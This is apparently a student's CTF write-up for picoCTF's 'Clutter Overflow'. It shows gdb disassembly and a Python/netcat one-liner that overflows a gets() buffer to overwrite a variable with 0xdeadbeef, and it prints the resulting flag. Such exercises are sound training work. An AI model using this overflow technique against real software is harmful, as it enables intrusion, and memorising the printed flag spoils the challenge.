## Descripción

Clutter, clutter everywhere and not a byte to use. `nc mars.picoctf.net 31890`


## Hints
+ 

## Solución

``` bash 
gdb 

0x40074c <main+133>     call   0x4005d0 <gets@plt>                         │
│   0x400751 <main+138>     mov    eax,0xdeadbeef                              │
│   0x400756 <main+143>     cmp    QWORD PTR [rbp-0x8],rax                     │
│   0x40075a <main+147>     jne    0x40078c <main+197>                         │
│   0x40075c <main+149>     mov    esi,0xdeadbeef                              │
│   0x400761 <main+154>     lea    rdi,[rip+0x690]        # 0x400df8           │
│   0x400768 <main+161>     mov    eax,0x0                             


```


``` bash
┌─[✗]─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/Examen_parcial_3/BinaryExplotation/03-Clutter_overflow]
└──╼ $(python3 -c 'import sys; sys.stdout.write("A" * 264)'; echo -e '\xef\xbe\xad\xde') | nc mars.picoctf.net 31890
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/Examen_parcial_3/BinaryExplotation/03-Clutter_overflow]
└──╼ $

```


## Flag
```picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}```



## Notas adicionales




## Referencias